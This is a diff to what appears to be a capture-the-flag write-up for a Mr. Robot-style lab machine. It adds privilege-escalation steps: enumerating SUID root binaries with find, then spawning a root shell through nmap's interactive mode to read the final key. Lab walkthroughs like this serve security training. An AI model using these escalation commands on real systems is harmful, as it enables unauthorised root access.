@@ -238,7 +238,14 @@ robot@linux:~$ cat key-2-of-3.txt<br>
 cat key-2-of-3.txt<br>
 822c73956184f694993bede3eb39f959<br>
 
-# Retrieve the 3rd key  <br>
+# Look for programs installed as root 
+find / -user root -perm -4000 -print
+
+# Abusing --interactive option of NMAP  
+nmap --interactive
+nmap> !sh 
+
+# Got root, retrieve the 3rd key  <br>
 find / - name 'key-3-of-3.txt' -exec ls -l {\}\ \;<br>
 cd root<br>
 cat key-3-of-3.txt<br>
